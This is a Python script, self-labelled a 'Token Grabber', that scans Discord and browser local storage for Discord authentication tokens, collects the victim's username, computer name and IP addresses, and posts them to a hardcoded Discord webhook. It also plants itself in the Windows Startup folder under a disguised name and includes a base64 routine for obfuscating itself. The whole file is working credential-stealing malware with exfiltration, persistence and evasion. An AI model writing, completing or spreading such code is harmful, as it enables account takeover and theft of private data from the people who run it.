import os
import re
import json
import base64
import requests
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE

WEBHOOK_URL = 'https://discord.com/api/webhooks/1193516273905184789/VpXClQXZcEZXoAnPsac2NP5_QRUwyCVrOFg-P65MMuUCSo-jpeEaMPyhvW6sYZxg30iw'

# Function to send data to the webhook
def send_data(webhook_url, content):
    headers = {
        "Content-Type": "application/json"
    }
    payload = json.dumps(content)
    try:
        requests.post(webhook_url, data=payload, headers=headers)
    except:
        pass

# Token extraction logic
def find_tokens(path):
    tokens = []
    path = os.path.join(path, 'Local Storage', 'leveldb')
    
    if not os.path.exists(path):
        return tokens

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        try:
            with open(f"{path}/{file_name}", 'r', errors='ignore') as file:
                for line in file.readlines():
                    line = line.strip()
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                                  r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        except:
            continue
    return tokens

# Browser path locations for token extraction
def get_token_paths():
    paths = {
        'Discord': os.getenv('APPDATA') + r'\\Discord',
        'Discord Canary': os.getenv('APPDATA') + r'\\discordcanary',
        'Discord PTB': os.getenv('APPDATA') + r'\\discordptb',
        'Google Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default',
        'Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable',
        'Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    return paths

# Gather system information and tokens
def gather_info():
    local_ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    public_ip = requests.get('https://jsonip.com').json()['ip']
    
    user = os.getenv("USERNAME")
    computer_name = os.getenv("COMPUTERNAME")
    token_paths = get_token_paths()
    
    message = {
        'username': 'Token Grabber',
        'avatar_url': 'https://i.imgur.com/RKSIgrF.png',
        'content': f'**New Token Grabs**\n'
                   f'**User:** {user}\n'
                   f'**Computer Name:** {computer_name}\n'
                   f'**Local IP:** {local_ip}\n'
                   f'**Public IP:** {public_ip}\n',
        'embeds': []
    }

    for platform, path in token_paths.items():
        tokens = find_tokens(path)
        if tokens:
            message['content'] += f"**Platform: {platform}**\n"
            for token in tokens:
                message['content'] += f"Token: {token}\n"
    
    send_data(WEBHOOK_URL, message)

# Persist on startup
def add_to_startup():
    file_path = os.path.realpath(__file__)
    startup_path = os.getenv("APPDATA") + r'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_manager.py'
    
    if not os.path.exists(startup_path):
        with open(startup_path, 'w') as startup_file:
            startup_file.write(f'@python {file_path}')

# Obfuscate code - Basic example using base64
def obfuscate_script():
    with open(__file__, 'r') as f:
        script = f.read()

    encoded_script = base64.b64encode(script.encode()).decode()
    with open('obfuscated.py', 'w') as f:
        f.write(f'import base64\nexec(base64.b64decode("{encoded_script}").decode())')

# Run main functionality
if __name__ == "__main__":
    add_to_startup()
    gather_info()
